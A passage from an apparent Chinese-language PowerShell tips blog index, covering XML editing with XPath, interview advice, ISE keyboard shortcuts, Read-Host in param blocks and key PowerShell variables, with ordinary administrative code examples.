对象中。您所需要做的只是将修改后的 XML 对象保存到文件，将修改的地方持久化起来。结果将显示在记事本中，看起来类似这样： &lt;!--6. machine details--&gt; &lt;Machine test=&quot;559669990&quot;&gt; &lt;Name&gt;NewServer0006&lt;/Name&gt; &lt;IP&gt;10.10.10.12&lt;/IP&gt; &lt;GUID&gt;cca8df99-78e1-48e0-8c4d-193c6d4acbd2&lt;/GUID&gt; &lt;Information info1=&quot;new attribute info&quot; info2=&quot;more info&quot;&gt;RawContent&lt;/Information&gt; &lt;CodeSegment info3=&quot;another attribute&quot;&gt;&lt;![CDATA[this is untouched code and can contain special characters /\\@&lt;&gt;]]&gt;&lt;/CodeSegment&gt; &lt;/Machine&gt; 您不用任何解析工作就瞬间完成了对已有 XML 文档的修改，并且不会破坏 XML 的结构。 用同样的方式，您可以进行大量的修改。假设所有的服务器都要赋予一个新的名称。旧名称是 _“ServerXXXX”_，新名称是 _“Prod_ServerXXXX”_。以下是解决方法： Foreach ($item in (Select-XML -Xml $xml -XPath '//Machine')) { $item.node.Name = 'Prod_' + $item.node.Name } $NewPath = &quot;$env:temp\\inventory2.xml&quot; $xml.Save($NewPath) notepad $NewPath 请注意 XML 文档中的所有服务器名称都更新了。Select-XML 这回不仅返回一个对象，而是返回多个，每个对象都是一个服务器。这是因为这回的 XPath 选择所有的“Machine”节点，并没有做特别的过滤。所以 foreach 循环里对所有节点都进行了操作。 在循环内部，Name 节点被赋予了一个新的值，当所有“Machine”节点都更新完以后，XML 文档被保存到文件并用记事本打开。 您可以能对这个例子有意见，为服务器名添加_“Prod_”_前缀，这点小改动太弱智了。不过我们在这里主要是向您介绍如何改变 XML 数据，而不是关注怎么做字符串操作。 不过，如果您坚持想知道如何实现例如将 “ServerXXXX” 替换成 _“PCXX”_（包括将四位数字转换为二位数字，这不算一个弱智的需求了吧），以下是解决方法： foreach($item in (Select-XML -Xml $xml -XPath '//Machine')) { if ($item.node.Name -match 'Server(\\d{4})') { $item.node.Name = 'PC{0:00}' -f [Int]$matches[1] } } $NewPath = &quot;$env:temp\\inventory2.xml&quot; $xml.Save($NewPath) notepad $NewPath 这次，我们用正则表达式以数字块的方式提取原先服务器的名称，然后用 -f 操作符重新格式化数字，并加上新的前缀。 我们这篇文章不关注正则表达式，也不关注数字的格式化。重要的是您能理解可以用任何技术来构造新的服务器名称。在剩下的部分，我们也遵循这一原则。 添加新数据有些时候，改变数据还不够。您可能会需要向列表添加新的服务器。这也是十分简单的。您只需要选择一个已有的节点，把它克隆一份，然后更新它的内容，再将它附加到父节点上即可。通过这种方式，您无须自己创建复杂的节点结构，并且可以确保新节点的结构和已有的节点完全一致。 这段代码将向服务器列表添加一台新的机器： # 克隆已有的节点结构 $item = Select-XML -Xml $xml -XPath '//Machine[1]' $newnode = $item.Node.CloneNode($true) # 根据需要更新信息 # 所有其它信息都和原始节点中的一致 $newnode.Name = 'NewServer' $newnode.IP = '1.2.3.4' # 获取您希望新节点所附加到的父节点： $machines = Select-XML -Xml $xml -XPath '//Machines' $machines.Node.AppendChild($newnode) $NewPath = &quot;$env:temp\\inventory2.xml&quot; $xml.Save($NewPath) notepad $NewPath 由于您新加的节点是从已有的节点克隆的，所以旧节点的所有信息都拷贝到了新的节点。您不想更新的信息可以保持原有的值。 那么如何向列表的顶部插入新的节点呢？只需要用 InsertBefore() 代替 AppendChild()： # 向列表的顶部添加节点： $machines.Node.InsertBefore($newnode, $item.node) 类似地，您可以在任意处插入新的节点。以下代码将在 Server0007 之后插入： # 在“Server0007”之后插入： $parent = Select-XML -Xml $xml -XPath '//Machine[Name=&quot;Server0007&quot;]' $machines.Node.InsertAfter($newnode, $parent.node) 移除 XML 内容从 XML 文件中删除数据也同样很简单。如果您想从列表中删掉 _Server0007_，以下是实现方法： # 删除“Server0007”： $item = Select-XML -Xml $xml -XPath '//Machine[Name=&quot;Server0007&quot;]' $null = $item.Node.ParentNode.RemoveChild($item.node) 您指尖上的强大力量通过以上展现的例子，您可以通过几行代码实现常见的 XML 操作需求。值得投入一些时间来提高 XML 和 XPath 的熟练度，这样您可以通过它们实现令人惊叹的功能。 对于一路读到这儿的朋友，我为你们准备了一点小礼物：一个我常用的很棒的小工具，我相信应该对你们也十分有用。 _ConvertTo-XML 可以将所有的对象转换为 XML，并且由于 XML 是一个分层的数据格式，所以通过控制深度，能够很好地展现嵌套的对象属性。所以您可以“展开”一个对象的结构并且查看它的所有属性，甚至递归地查看嵌套的属性。 不用 XML 和 XPath 的话，您只能查看原始的 XML 并且靠自己查找信息。例如，如果您想查看 PowerShell 的颜色信息到底存储在 $host 对象的什么地方，您可以这么做（也许不是一个好方法，因为您可能会被原始的 XML 信息淹没）： $host | ConvertTo-XML -Depth 5 | Select-Object -ExpandProperty outerXML 通过刚才演示的知识，您现在可以读取原始的 XML ，然后解析并过滤对象的属性。 以下是称为 Get-ObjectProperty 的辅助函数，有点类似 Get-Member 的意思。它能告诉您对象中的哪个属性存放了您想要的值。让我们来看看： PS&gt; $host | Get-ObjectProperty -Depth 2 -Name *color* Name Value Path Type ---- ----- ---- ---- TokenColors $obj1.PrivateData.To... Microsoft.PowerShel... ConsoleTokenColors $obj1.PrivateData.Co... Microsoft.PowerShel... XmlTokenColors $obj1.PrivateData.Xm... Microsoft.PowerShel... ErrorForegroundColor #FFFF0000 $obj1.PrivateData.Er... System.Windows.Medi... ErrorBackgroundColor #FFFFFFFF $obj1.PrivateData.Er... System.Windows.Medi... WarningForegroundColor #FFFF8C00 $obj1.PrivateData.Wa... System.Windows.Medi... WarningBackgroundColor #00FFFFFF $obj1.PrivateData.Wa... System.Windows.Medi... VerboseForegroundColor #FF00FFFF $obj1.PrivateData.Ve... System.Windows.Medi... VerboseBackgroundColor #00FFFFFF $obj1.PrivateData.Ve... System.Windows.Medi... DebugForegroundColor #FF00FFFF $obj1.PrivateData.De... System.Windows.Medi... DebugBackgroundColor #00FFFFFF $obj1.PrivateData.De... System.Windows.Medi... ConsolePaneBackgroun... #FF012456 $obj1.PrivateData.Co... System.Windows.Medi... ConsolePaneTextBackg... #FF012456 $obj1.PrivateData.Co... System.Windows.Medi... ConsolePaneForegroun... #FFF5F5F5 $obj1.PrivateData.Co... System.Windows.Medi... ScriptPaneBackground... #FFFFFFFF $obj1.PrivateData.Sc... System.Windows.Medi... ScriptPaneForeground... #FF000000 $obj1.PrivateData.Sc... System.Windows.Medi... 这将返回 $host 中所有名字包含 “Color” 的嵌套属性。控制台输出很可能被截断，所以您最好将结果输出到 grid view 窗口： $host | Get-ObjectProperty -Depth 2 -Name *color* | Out-GridView 请注意 “Path” 列：这个属性精确指示了您如何存取一个指定的嵌套属性。在这个例子里，Get-ObjectProperty 在对象层次中遍历两层。如果指定更深的便利层次，将会展开更多的信息，不过也会导致结果中含有更多的垃圾信息。 虽然您可以通过管道输入多个对象，但是最好一次只导入一个，以免产生大量的结果数据。这行代码将列出进程对象所有嵌套的属性，递归层次为 5，将产生大量的结果： PS&gt; Get-Process -id $pid | Get-ObjectProperty -Depth 5 -IsNumeric Name Value Path Type ---- ----- ---- ---- Handles 684 $obj1.Handles System.Int32 VM 1010708480 $obj1.VM System.Int32 WS 291446784 $obj1.WS System.Int32 PM 251645952 $obj1.PM System.Int32 NPM 71468 $obj1.NPM System.Int32 CPU 161,0398323 $obj1.CPU System.Double BasePriority 8 $obj1.BasePriority System.Int32 HandleCount 684 $obj1.HandleCount System.Int32 Id 4560 $obj1.Id System.Int32 Size 264 $obj1.MainModule.Size System.Int32 ModuleMemorySize 270336 $obj1.MainModule.Mod... System.Int32 FileBuildPart 9421 $obj1.MainModule.Fil... System.Int32 FileMajorPart 6 $obj1.MainModule.Fil... System.Int32 FileMinorPart 3 $obj1.MainModule.Fil... System.Int32 ProductBuildPart 9421 $obj1.MainModule.Fil... System.Int32 ProductMajorPart 6 $obj1.MainModule.Fil... System.Int32 ProductMinorPart 3 $obj1.MainModule.Fil... System.Int32 Size 264 $obj1.Modules[0].Size System.Int32 ModuleMemorySize 270336 $obj1.Modules[0].Mod... System.Int32 (...) 这行代码将返回 spooler 服务对象中所有“String”类型的嵌套属性： PS&gt; Get-Service -Name spooler | Get-ObjectProperty -Type System.String Name Value Path Type ---- ----- ---- ---- Name spooler $obj1.Name System.String Name RPCSS $obj1.RequiredServic... System.String Name DcomLaunch $obj1.RequiredServic... System.String DisplayName DCOM Server Process ... $obj1.RequiredServic... System.String MachineName . $obj1.RequiredServic... System.String ServiceName DcomLaunch $obj1.RequiredServic... System.String Name RpcEptMapper $obj1.RequiredServic... System.String DisplayName RPC Endpoint Mapper $obj1.RequiredServic... System.String (...) 以下是 Get-ObjectProperty 的源代码。它虽然不只是几行代码，但仍然相当短小精悍。 它完全使用了刚才介绍的技术，所以如果您对以上的例子感到满意，您也可以尝试并消化它的代码，或只是把它当做一个工具，而不用关心它对 XML 做的魔法。 Function Get-ObjectProperty { param ( $Name = '*', $Value = '*', $Type = '*', [Switch]$IsNumeric, [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [Object[]]$InputObject, $Depth = 4, $Prefix = '$obj' ) Begin { $x = 0 Function Get-Property { param ( $Node, [String[]]$Prefix ) $Value = @{Name='Value'; Expression={$_.'#text' }} Select-Xml -Xml $Node -XPath 'Property' | ForEach-Object {$i=0} { $rv = $_.Node | Select-Object -Property Name, $Value, Path, Type $isCollection = $rv.Name -eq 'Property' if ($isCollection) { $CollectionItem = &quot;[$i]&quot; $i++ $rv.Path = (($Prefix) -join '.') + $CollectionItem } else { $rv.Path = ($Prefix + $rv.Name) -join '.' } $rv if (Select-Xml -Xml $_.Node -XPath 'Property') { if ($isCollection) { $PrefixNew = $Prefix.Clone() $PrefixNew[-1] += $CollectionItem Get-Property -Node $_.Node -Prefix ($PrefixNew ) } else { Get-Property -Node $_.Node -Prefix ($Prefix + $_.Node.Name ) } } } } } Process { $x++ $InputObject | ConvertTo-Xml -Depth $Depth | ForEach-Object { $_.Objects } | ForEach-Object { Get-Property $_.Object -Prefix $Prefix$x } | Where-Object { $_.Name -like &quot;$Name&quot; } | Where-Object { $_.Value -like $Value } | Where-Object { $_.Type -like $Type } | Where-Object { $IsNumeric.IsPresent -eq $false -or $_.Value -as [Double] } } }","link":"/2017/06/03/Mastering-Everyday-XML-Tasks-in-PowerShell/"},{"title":"准备一场 PowerShell 技术面试","text":"理解 Windows PowerShell 是什么初学者的第一个问题总是“请告诉我，PowerShell 是什么？” PowerShell 不仅仅是一个新的 shell（外壳）。PowerShell 是一个面向对象的分布式自动化引擎、脚本语言，以及命令行 shell。我不指望一个初学者能完全理解我刚才说的，不过至少，我希望您能理解 PowerShell 天生是面向对象的。如果说“因为 PowerShell 是基于 .NET 框架的，所以它是面向对象的”，这句话并不太准确。实际上，我们说 PowerShell 是面向对象的，是因为它处理的是对象而不是文本。让我们看一个例子。 这是我在 DOS 的批处理脚本中获取一个文件夹（包括子文件夹等）大小的方法： @echo off For /F &quot;tokens=*&quot; %%a IN ('&quot;dir /s /-c /a | find &quot;bytes&quot; | find /v &quot;free&quot;&quot;') do Set xsummary=%%a For /f &quot;tokens=1,2 delims=)&quot; %%a in (&quot;%xsummary%&quot;) do set xfiles=%%a&amp;set xsize=%%b Set xsize=%xsize:bytes=% Set xsize=%xsize: =% Echo Size is: %xsize% Bytes 您看到这有多痛苦了吗？有多少人能理解这段批处理脚本到底在做什么？ 好吧，让我们来看看用 PowerShell 如何实现。 Get-ChildItem –Recurse | Measure-Object -Property Length -Sum 很简单吧？至少，它看上去很清爽。这是因为 PowerShell 能处理对象——那些能自我描述的东西。这些对象拥有各种属性。文件对象有一个 Length 属性是代表文件的大小有多少字节的。所以，我们把文件夹下所有文件的大小加起来，就能得到文件夹的大小。如何你把这段 PowerShell 脚本和刚才的 DOS 批处理脚本做一个比较，可以看出我们用不着处理任何临时变量和解析文本。我们只需要将 Get-ChildItem cmdlet 的结果通过管道输出到 Measure-Object，并且将管道中传过来的每个对象的 Length 属性求和即可。 好了，这是一个解释 PowerShell 天生是面向对象的一个小例子。当您开始学习 PowerShell 之后，将可以举出更多类似的例子。 我们再假设一个问题“如何获得某个进程的 CPU 相关性？”，您会怎么实现？ 有些人会这么做： $process = Get-Process -Name notepad 目前这么操作 OK。然后他们接下来在键盘上敲： $process.&lt;Tab&gt; &lt;Tab&gt; &lt;Tab&gt; … &lt;Tab&gt; 直到找到所需要的属性为止。 虽然这么做也没错，可以获得您要的属性，不过万一你要的属性是 100 个属性中的第 99 个呢？显然不太明智，是吧？现在学习 shell 的使用就很有帮助了。在 shell 中有更好的办法实现这个。 如果您知道精确的属性名： Get-Process -Name Notepad | Select-Object ProcessorAffinity 或者 $process = Get-Process -Name Notepad $process.ProcessorAffinity 如果您不知道精确的属性名，不要一直按 Tab！请用 PowerShell 的自我探索功能。这是接下来我们要讨论的问题。 学习如何探索 PowerShell初学者最重要的事情是了解如何使用以下的 cmdlet： Get-Command Get-Member Get-Help Get-CommandGet-Command 返回一个 PowerShell 会话中可用的所有命令。据我观察，某些初学者在输入一个不存在的或者错误的 cmdlet 名字以后，一直在纠结为什么不能用。如果我们知道如何探索 PowerShell，我们就可以用 Get-Command cmdlet 来验证我们想要用的命令是否存在。例如： PS C:\\&gt; Get-Command -Name Get-ComputerName Get-Command : The term 'Get-ComputerName' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:1 + Get-Command -Name Get-ComputerName + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (Get-ComputerName:String) [Get-Command], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundException,Microsoft.PowerShell.Commands.GetCommandCommand 见到了吗？您还可以用 Get-Command 针对特定的动词或者名词来获取命令，甚至可以使用通配符来过滤。 Get-Command -Noun Host Get-Command -Verb Write Get-Command N* Get-Member在前面的段落中，我们学习了如何获得一个对象的某个属性。但是，只有您精确地知道属性名才能用。那么我们如何探索某个对象中有哪些属性和方法可用呢？Get-Member 这时候派上用场了。 Get-Process | Get-Member 以上命令可以获取某个对象类型的所有属性、方法和事件。您可以对它进一步地筛选来找到您感兴趣的成员。 Get-Process | Get-Member -MemberType MethodGet-Process | Get-Member -MemberType PropertyGet-Process | Get-Member -MemberType Event Get-Help另外一个初学者常见的问题是对内置的帮助系统没什么概念。PowerShell 内置的 cmdlet 都带有如何使用的详细说明。当然，在 PowerShell 3.0 及更高的版本，您首先需要用 Update-Help cmdlet 来更新帮助内容。当您想了解某个 PowerShell cmdlet 的详细语法时，您就可以使用用 Get-Help cmdlet。它能告诉您 cmdlet 参数的信息、如何使用每个参数、以及提供一些例子。当不明白怎么使用时，您第一件事就应该是查看本地的帮助系统。 Get-Help Get-Command Get-Help Get-Member -Detailed Get-Help Get-Process –Examples Get-Help Get-Service –Parameter InputObject 使用 shell我不指望一个初学者能掌握编写脚本和模块的知识。但至少要掌握使用 shell 的技能。您必须亲自动手实践一下内置的 cmdlet。这包括了一些简单的操作，比如说列出服务、进程、文件和文件夹。至少要会用 Get-ChildItem 来递归地搜索文件，才算是接触到了 PowerShell 的表层，才算是一名初学者。 在学习 PowerShell 的过程中，您应该从 shell 开始学起。基本上在 PowerShell 命令行中能运行的一切命令，都能在脚本中运行。所以一开始可以在 shell 中用 PowerShell 语言和内置的 cmdlet 来做一些简单的任务。最终，您将会学习如何编写脚本。这是初学 PowerShell 很重要的一个方向。 某些人对我说，他们只了解一些特定产品专用的 PowerShell cmdlet，并且他们只要用哪些 cmdlet 就够了。那么能告诉我只用特定产品专用的 cmdlet 而不用任何内置的 cmdlet、管道以及 PowerShell 语言要怎么完成一个自动化任务呢？这是不可能做到的。如果有些人认为可能，那么很可能他们根本不了解基础只是或者从来没有用过 shell。 学习管道在用 PowerShell 的过程中，如果要有效地使用它，您需要了解什么是管道，以及您可以将多个命令用管道连接起来。我在前面段落的例子中已经用到了管道，只是没有深入讲解它是什么。运行一个简单的命令不是什么难事。不过当您把多个命令用管道连接起来变成一个更大的任务时，您就会意识到管道的强大之处。要完整地讨论管道的知识，需要 50 - 75 页书才能讲完。让我们保持这篇文章简单易懂一些。 我们假想 PowerShell 的管道是一个制造单元的一条组装线。在一个制造单元中，部件从一个站点传递到另一个站点以及输出端，一路装配过来。我们可以在组装线的最末端看到装配完成的产品。通过类似这样的方式，当我们将多个 PowerShell cmdlet 用管道连接起来时，一个命令的输出结果会作为下一个命令的输入参数。例如： Get-Process -Name s* | Where-Object { $_.HandleCount -lt 100 } 在上述命令中，Get-Process 命令输出的一个或多个对象会作为输入送给 Where-Object cmdlet。Where-Object 命令过滤出输入对象数组中 HandleCount 属性小于 100 的对象。您当然也可以不用管道来完成这个任务。让我们看看做起来是怎么样。 $process = Get-Process -name s* foreach ($proc in $process) { if ($proc.HandleCount -lt 100) { $proc } } 如您所见，要写更多的代码。这还不是大问题，您会看到生成输出时的区别。在这个例子里，许多人认为第一个命令执行完以后，所有的输出结果送入第二个命令。这样描述并不精确。在管道中，第一个命令每生成一个对象，就立即向第二个命令传递。 前一个例子只合并了两个命令，所以看起来很微不足道。让我们看看下一个例子： Get-ChildItem -Recurse -Force | Where-Object {$_.Length -gt 10MB} | Sort-Object -Property Length -Descending | Select-Object Name, @{name='Size (MB)'; expression={$_.Length/1MB}}, Extension | Group-Object -Property extension 我不指望一名初学者能理解这段代码，或是写出这样的代码。不过，这段代码显示出管道的强大之处。上述的命令（或者说用管道连接的命令）获取所有大于 10MB 的文件，将它们按文件的大小降序排列，然后将它们按文件的扩展名分组。您敢不敢不用管道将这段代码的功能实现一遍？ 不要过度设计PowerShell 往往提供多种方法来实现同一件事情。当然，这些方法各有差别。有效率上的差别，有简单和复杂的差别。 所以，当我提出“请告诉我计算机名”的需求时，我不希望您开始写一段 WMI 查询语句： Get-WmiObject -Class Win32_ComputerSystem | Select-Object -Property Name 或 Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property CSName 您可能坚称这些命令确实可以获取本地计算机名。但是，请您理解有更好的方法来实现： $env:ComputerName 噢，用传统的 hostname 命令也得到了相同的结果。一切正确。我常常使用它。不过，我们现在关注的是 PowerShell，对吧？ 编写脚本这是另一个常见的问题。您也许知道如何运行别人写的脚本。不过，这样能使您成为一个脚本编写者吗？不可能。阅读别人写的脚本确实能帮您理解最佳和最差实践。但是，当您是一个初学者时，这不会有助于您的学习。只有您自己动手编写自己的脚本才能学到知识。 还有，不要轻易说您会编写高级的函数。除非您知道如何描述通用参数、参数类型、cmdletbinding，以及 Begin、Process 和 End 代码块是如何工作和为什么需要它们。如果您不了解这些概念，就不要觉得自己写过 PowerShell 的高级函数。高级函数和我们平时在 PowerShell 中写的普通函数是不同的。当您在函数定义中增加了 CmdletBinding() 以后，函数的基本行为就改变了。我们来看一个例子吧？ 以下是一个普通函数，接受两个数字输入参数，并且返回它们的和。 function sum { param ( $number1, $number2 ) $number1 + $number2 } PS C:\\&gt; sum 10 30 40 现在，用不同个数的参数来调用这个函数。 PS C:\\&gt; sum 10 30 40 40 见到了吗？虽然我们在函数定义中只有两个参数，但它也可以接受三个参数，并且只是把第三个参数忽略掉。现在，加入 CmdletBinding() 属性并看看行为发生什么变化。 function sum { [CmdletBinding()] param ( $number1, $number2 ) $number1 + $number2 } 用先前一样的参数再次测试！ PS C:\\&gt; sum 10 30 40 PS C:\\&gt; sum 10 30 40 sum : A positional parameter cannot be found that accepts argument '40'. At line:1 char:1 + sum 10 30 40 + ~~~~~~~~~~~~ + CategoryInfo : InvalidArgument: (:) [sum], ParameterBindingException + FullyQualifiedErrorId : PositionalParameterNotFound,sum 见到了吗？加入了 CmdletBionding() 属性以后，处理输入参数的基本行为发生了变化。这是一个高级的 PowerShell 函数。但是，这只是开头。我们在这里不再深入下去，我希望您在告诉我写过高级函数之前知道这些。 不要依赖搜索引擎我听很多人说他们写脚本的时候要依赖 Google。他们只是使用搜索引擎，查找问题现成的解决方案，并且直接拿来用。他们常常是开始编写脚本或者尝试做一个任务几分钟就放弃了。我只有在我彻底没有思路，实在继续不下去的时候才用搜索引擎。或者当我知道某些人已经开发了一个脚本并且我不想重复发明轮子的时候。但是，当我想学习 PowerShell 的时候，我不会用这种方式。搜索引擎是寻找解决方案的最简单方法，但是您从中学不到任何东西，除了怎么用搜索引擎。特别地，当您还是一个初学者时，直接使用现成的脚本对学习没有任何帮助。 祝您好运！","link":"/2017/06/03/Preparing-for-a-PowerShell-Interview/"},{"title":"PowerShell 技能连载 - 强制刷新客户端时间","text":"如果您的客户端没有和您的域控制器正常地同步时间，请使用以下代码。这段代码需要管理员特权： 1w32tm.exe /resync /force","link":"/2017/06/05/force-client-time-resync/"},{"title":"PowerShell ISE 4.0 完整快捷键清单","text":"PowerShell ISE 是编写 PowerShell 脚本最重要的环境。熟练掌握 ISE 的快捷键有以下好处： 逼格高（这个很重要） 提高效率 预防腕管炎 ……（请自行脑补） 其实，所有快捷键的定义都在 ISE 的 Microsoft.PowerShell.GPowerShell（DLL）中。我们首先需要获取这个 DLL 的引用。 123456PS&gt; $gps = $psISE.GetType().AssemblyPS&gt; $gpsGAC Version Location--- ------- --------True v4.0.30319 C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.GPowerShell\\... 然后我们可以获取这个程序集的资源列表： 1234PS&gt; $gps.GetManifestResourceNames()Microsoft.PowerShell.GPowerShell.g.resourcesGuiStrings.resources 然后我们创建一个 ResourceManager 对象来存取程序集中的资源。在构造函数中将需要打开的资源名（去掉 .resources 扩展名）以及包含资源的程序集对象传给它。 1$rm = New-Object System.Resources.ResourceManager GuiStrings,$gps 剩下只要调用 GetResourceSet() 方法根据特定的文化信息获取资源。 123456789101112 $rs = $rm.GetResourceSet((Get-Culture),$true,$true) $rs Name Value ---- ----- SnippetToolTipPath 路径: {0} MediumSlateBlueColorName 中石板蓝色&gt; EditorBoxSelectLineDownShor... Alt+Shift+Down NewRunspace 新建 PowerShell 选项卡(_E)&gt; EditorSelectToPreviousChara... Shift+Left&gt; RemoveAllBreakpointsShortcut Ctrl+Shift+F9 SaveScriptQuestion 是否保存 {0}? 查看输出结果，我们可以发现包含“&gt;”的几行类似按键组合信息。如果您仔细查看输出结果，将会发现规律是 Name 以 Shortcut 结尾（有可能包含数字），以及以 F 开头加 1 至 2 位数字并带有 Keyboard 关键字的。通过下面一行代码，我们可以过滤出所有和键盘有关系的项目并对它们进行排序。 1$rs | where Name -match 'Shortcut\\d?$|^F\\d+Keyboard' | Sort-Object Value 以下是完整的代码片段和完整的结果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114$gps = $psISE.GetType().Assembly$rm = New-Object System.Resources.ResourceManager GuiStrings,$gps$rs = $rm.GetResourceSet((Get-Culture),$true,$true)$rs | where Name -match 'Shortcut\\d?$|^F\\d+Keyboard' | Sort-Object Value | Format-Table -AutoSizeName Value---- -----EditorUndoShortcut2 Alt+BackspaceEditorSelectNextSiblingShortcut Alt+DownExitShortcut Alt+F4EditorSelectEnclosingShortcut Alt+LeftEditorSelectFirstChildShortcut Alt+RightEditorRedoShortcut2 Alt+Shift+BackspaceEditorBoxSelectLineDownShortcut Alt+Shift+DownToggleHorizontalAddOnPaneShortcut Alt+Shift+HEditorBoxSelectToPreviousCharacterShortcut Alt+Shift+LeftEditorBoxSelectToNextCharacterShortcut Alt+Shift+RightEditorTransposeLineShortcut Alt+Shift+TEditorBoxSelectLineUpShortcut Alt+Shift+UpToggleVerticalAddOnPaneShortcut Alt+Shift+VEditorSelectPreviousSiblingShortcut Alt+UpShowScriptPaneTopShortcut Ctrl+1ShowScriptPaneRightShortcut Ctrl+2ShowScriptPaneMaximizedShortcut Ctrl+3EditorSelectAllShortcut Ctrl+AZoomIn1Shortcut Ctrl+AddEditorMoveCurrentLineToBottomShortcut Ctrl+Alt+EndEditorMoveCurrentLineToTopShortcut Ctrl+Alt+HomeEditorDeleteWordToLeftShortcut Ctrl+BackspaceStopExecutionShortcut Ctrl+BreakStopAndCopyShortcut Ctrl+CGoToConsoleShortcut Ctrl+DEditorDeleteWordToRightShortcut Ctrl+DelEditorScrollDownAndMoveCaretIfNecessaryShortcut Ctrl+DownEditorMoveToEndOfDocumentShortcut Ctrl+EndFindShortcut Ctrl+FShowCommandShortcut Ctrl+F1CloseScriptShortcut Ctrl+F4GoToLineShortcut Ctrl+GReplaceShortcut Ctrl+HEditorMoveToStartOfDocumentShortcut Ctrl+HomeGoToEditorShortcut Ctrl+ICopy2Shortcut Ctrl+InsShowSnippetShortcut Ctrl+JEditorMoveToPreviousWordShortcut Ctrl+LeftToggleOutliningExpansionShortcut Ctrl+MZoomOut3Shortcut Ctrl+MinusNewScriptShortcut Ctrl+NOpenScriptShortcut Ctrl+OGoToMatchShortcut Ctrl+Oem6ZoomIn3Shortcut Ctrl+PlusToggleScriptPaneShortcut Ctrl+REditorMoveToNextWordShortcut Ctrl+RightSaveScriptShortcut Ctrl+SZoomIn2Shortcut Ctrl+Shift+AddGetCallStackShortcut Ctrl+Shift+DEditorSelectToEndOfDocumentShortcut Ctrl+Shift+EndRemoveAllBreakpointsShortcut Ctrl+Shift+F9HideHorizontalAddOnToolShortcut Ctrl+Shift+HEditorSelectToStartOfDocumentShortcut Ctrl+Shift+HomeListBreakpointsShortcut Ctrl+Shift+LEditorSelectToPreviousWordShortcut Ctrl+Shift+LeftZoomOut4Shortcut Ctrl+Shift+MinusStartPowerShellShortcut Ctrl+Shift+PZoomIn4Shortcut Ctrl+Shift+PlusNewRemotePowerShellTabShortcut Ctrl+Shift+REditorSelectToNextWordShortcut Ctrl+Shift+RightZoomOut2Shortcut Ctrl+Shift+SubtractEditorMakeUppercaseShortcut Ctrl+Shift+UHideVerticalAddOnToolShortcut Ctrl+Shift+VIntellisenseShortcut Ctrl+SpaceZoomOut1Shortcut Ctrl+SubtractNewRunspaceShortcut Ctrl+TEditorMakeLowercaseShortcut Ctrl+UEditorScrollUpAndMoveCaretIfNecessaryShortcut Ctrl+UpPaste1Shortcut Ctrl+VCloseRunspaceShortcut Ctrl+WCut1Shortcut Ctrl+XEditorRedoShortcut1 Ctrl+YEditorUndoShortcut1 Ctrl+ZF1KeyboardDisplayName F1HelpShortcut F1StepOverShortcut F10F10KeyboardDisplayName F10StepIntoShortcut F11F11KeyboardDisplayName F11F12KeyboardDisplayName F12F2KeyboardDisplayName F2FindNextShortcut F3F3KeyboardDisplayName F3F4KeyboardDisplayName F4RunScriptShortcut F5F5KeyboardDisplayName F5F6KeyboardDisplayName F6F7KeyboardDisplayName F7RunSelectionShortcut F8F8KeyboardDisplayName F8F9KeyboardDisplayName F9ToggleBreakpointShortcut F9EditorDeleteCharacterToLeftShortcut Shift+BackspaceCut2Shortcut Shift+DelEditorSelectLineDownShortcut Shift+DownEditorSelectToEndOfLineShortcut Shift+EndEditorInsertNewLineShortcut Shift+EnterStepOutShortcut Shift+F11FindPreviousShortcut Shift+F3StopDebuggerShortcut Shift+F5EditorSelectToStartOfLineShortcut Shift+HomePaste2Shortcut Shift+InsEditorSelectToPreviousCharacterShortcut Shift+LeftEditorSelectPageDownShortcut Shift+PgDnEditorSelectPageUpShortcut Shift+PgUpEditorSelectToNextCharacterShortcut Shift+RightEditorSelectLineUpShortcut Shift+Up","link":"/2017/06/03/The-Complete-List-of-PowerShell-ISE-4-0-Keyboard-Shortcuts/"},{"title":"PowerShell 技能连载 - Read-Host 阻塞自动化操作","text":"使用 Read-Host 向用户提示输入信息可能会造成问题，因为它影响了脚本的自动化运行。一个更好的方法是将 Read-Host 包装在 param() 代码块中。通过这种方式，该信息可以通过无人值守操作的参数传入，也可以通过交互式提示传入： 12345678param( $Name = $(Read-Host -Prompt 'Enter your name'), $Id = $(Read-Host -Prompt 'Enter your ID'))&quot;You are $Name and your ID is $Id&quot; 当您运行以上脚本时，它像 Read-Host 一模一样地显示提示信息。您也可以通过参数执行该脚本： 1PS&gt; C:\\myscript.ps1 –Name test –Id 12 If you do not need custom prompting, you can go even simpler, and declare parameters as mandatory by adding [Parameter(Mandatory)] above each parameter variable.如果您不需要自定义提示信息，您还可以更加简单，只需要在每个参数变量上加上 [Parameter(Mandatory)] 使它们变为必需参数。","link":"/2017/06/06/read-host-blocks-automation/"},{"title":"PowerShell 技能连载 - 重要的 PowerShell 变量","text":"以下是一个重要的 PowerShell 变量的列表：$pshome 表示 PowerShell 所在的位置。$home 是个人用户配置文件夹的路径。$PSVersionTable 返回 PowerShell 的版本和重要的子组件的版本： 123456789101112131415161718PS&gt; $pshomeC:\\Windows\\System32\\WindowsPowerShell\\v1.0PS&gt; $HOMEC:\\Users\\tweltnerPS&gt; $PSVersionTableName Value---- -----PSVersion 5.1.14393.0PSEdition DesktopPSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}BuildVersion 10.0.14393.0CLRVersion 4.0.30319.42000WSManStackVersion 3.0PSRemotingProtocolVersion 2.3SerializationVersion 1.1.0.1 $profile 是您个人的自启动脚本所在的位置。每当您当前的 PowerShell 宿主启动时，自启动脚本就会自动加载（假设文件存在）。$profile.CurrentUserAllHosts 是任何宿主都会加载的配置文件脚本。并且 $env:PSModulePath 列出 PowerShell 可以自动发现的存放 PowerShell module 的文件夹： 123456789101112PS&gt; $profileC:\\Users\\tweltner\\Documents\\WindowsPowerShell\\Microsoft.PowerShellISE_profile.ps1PS&gt; $profile.CurrentUserAllHostsC:\\Users\\tweltner\\Documents\\WindowsPowerShell\\profile.ps1PS&gt; $env:PSModulePath -split ';'C:\\Users\\tweltner\\Documents\\WindowsPowerShell\\ModulesC:\\Program 